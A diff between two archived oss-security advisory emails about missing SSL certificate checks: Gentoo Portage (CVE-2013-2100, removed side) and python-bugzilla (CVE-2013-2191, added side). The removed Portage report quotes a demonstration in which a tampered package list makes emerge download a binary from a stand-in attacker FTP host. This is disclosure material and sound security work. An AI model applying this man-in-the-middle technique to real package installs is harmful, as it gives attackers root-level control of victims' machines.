@@ -1,86 +1,30 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/16/3
-Message-ID: <51943A43.8070008@redhat.com>
-Date: Wed, 15 May 2013 19:45:39 -0600
-From: Kurt Seifried <kseifried@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/06/19/6
+Message-ID: <819346344.21944230.1371661120661.JavaMail.root@redhat.com>
+Date: Wed, 19 Jun 2013 12:58:40 -0400 (EDT)
+From: Jan Lieskovsky <jlieskov@...hat.com>
 To: oss-security@...ts.openwall.com
-CC: "Jason A. Donenfeld" <Jason@...c4.com>, Gentoo Security <security@...too.org>, zx2c4@...too.org
-Subject: Re: CVE Request: Man in the middle on Gentoo Portage binary package installer
+Cc: "Steven M. Christey" <coley@...us.mitre.org>, Cole Robinson <crobinso@...hat.com>, Florian Weimer <fweimer@...hat.com>
+Subject: [CVE identifier assignment notification] CVE-2013-2191 python-bugzilla: Does not verify Bugzilla server certificate
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Hello Kurt, Steve, vendors,
 
-On 05/15/2013 04:46 AM, Jason A. Donenfeld wrote:
-> Hi Kurt,
-> 
-> Portage is the package manager of Gentoo Linux. It supports many 
-> features, one of which is the ability to synchronize against a
-> remote list of binary packages, and use that list to determine
-> where to fetch such binary packages. One of the fields in this list
-> of packages is URI:
-> 
-> victim # curl -s -k https://portage-build.zx2c4.com/Packages | grep
-> URI: URI: ftp://horrible.attacker.somewhere.on.the.internet/blah
-> 
-> victim # emerge -1 portage-utils Calculating dependencies... done!
-> 
->>>> Emerging binary (1 of 1) app-portage/portage-utils-0.30 from
->>>> gentoo
-> --2013-05-15 12:33:32-- 
-> ftp://horrible.attacker.somewhere.on.the.internet/blah/app-portage/portage-utils-0.30.tbz2
->
-> 
-=> ‘/usr/portage/packages/app-portage/portage-utils-0.30.tbz2’
-> Resolving horrible.attacker.somewhere.on.the.internet...
-> 
-> Over insecure connections, Portage provides the ability to use
-> HTTPS (in addition to SFTP and SSH), so that this remote list of
-> binary packages is not tampered with. This list of binary packages
-> will be downloaded in the background silently. Unfortunately,
-> Portage does not validate the SSL certificates, leaving this open
-> to a trivial man in the middle attack. An attacker could leverage
-> this man in the middle vector to remotely gain complete control
-> over a victim's machine, since Portage runs with essentially full
-> permissions.
-> 
-> I reported this to the maintainer of Portage in Gentoo Bug #469888 
-> [1], and it was fixed in commit b5969af9f5 [2].
-> 
-> Do note that while this commit solves the immediate problem with 
-> fetching /Packages, as detailed above, there may be other
-> additional unconfirmed insecure uses of the vulnerable urlopen()
-> function that have not yet been analyzed or fixed.
-> 
-> Thanks, Jason
-> 
-> 
-> [1] https://bugs.gentoo.org/show_bug.cgi?id=469888 [2]
-> http://git.overlays.gentoo.org/gitweb/?p=proj/portage.git;a=commit;h=b5969af9f575e4e4b669f44e76ad01f0dbc2dd27
->
-> 
-Yeah SSL with no certificate checks is not so good.
+  It was found that python-bugzilla, a Python library for interacting with Bugzilla
+instances over XML-RPC functionality, did not perform X.509 certificate verification
+when using secured SSL connection. A man-in-the-middle (MiTM) attacker could use this
+flaw to spoof Bugzilla server via an arbitrary certificate.
 
-Please use CVE-2013-2100 for this issue.
+Credit: This issue was discovered by Florian Weimer of the Red Hat Product Security Team.
 
+CVE id: CVE-2013-2191 has been assigned to this issue
 
-- -- 
-Kurt Seifried Red Hat Security Response Team (SRT)
-PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.13 (GNU/Linux)
+Relevant upstream patch:
+  https://git.fedorahosted.org/cgit/python-bugzilla.git/commit/?id=a782282ee479ba4cc1b8b1d89700ac630ba83eef
 
-iQIcBAEBAgAGBQJRlDpCAAoJEBYNRVNeJnmTZIMQANMmQfww+/2TTShIa3AcO9sS
-S6KnC2w40Q8eRza+8rMMWQ0w91e+vhQuQ09Zyl02xWctSE6WvlM/jtZTHKwjY4lh
-q2pxkSdMecTbNANtfkaIlU5rsWiROuGbvb33ITwjJNvONVGPh9+kx/xccRqodHc2
-hlb9jhdKlZSVEUgIeCCBDTWGZnwbQF3CK9tFMWJGj6lTdOaqCiM04whfHmX9urje
-6Fj0vLW1VbbGmFQZbIJajGzwNZQvwlNN9/5kn5nWE6WzfqXwxmj1NpuVlnFSpU83
-0jeWEdbA0b7mKkDiBryuo5eRtJmdAHxpe+Mvqin/d+pXRLX7qbvpY2IlXTQR2U/u
-jtmO943UR+nRHdItAX0VPG6ua4AEecnqgUTYymMrt4344u8I3RoLwjxDGmmZyThV
-0i84orR8rbdawQOUWUIjkrK9n/fPHDJ3QBdegZ5Na3nyGGdXSiApFzaxcfKmpVDe
-4SzcNVghPQNj5mEappBTIPO5KdPF6FIQxWcj9/a6M9bVwJEyd4gZVTgQmGLAwHgQ
-jKdmWzh/hBwm+RTfgJMZI0nJmydUCFlGgd5PAFkMY7VY1lvbbaEEYQPdDE1mtHL1
-60cB38PYBL5Thf25FqV+7cpjZTglOyDJsylPgHG3B6M5SDJXmKxgvnaJAW3+zpmQ
-y/dM0r9LeQu5MhPhsdeC
-=JhKw
------END PGP SIGNATURE-----
+References:
+  https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2013-2191
+
+Thank you && Regards, Jan.
+--
+Jan iankko Lieskovsky / Red Hat Security Response Team
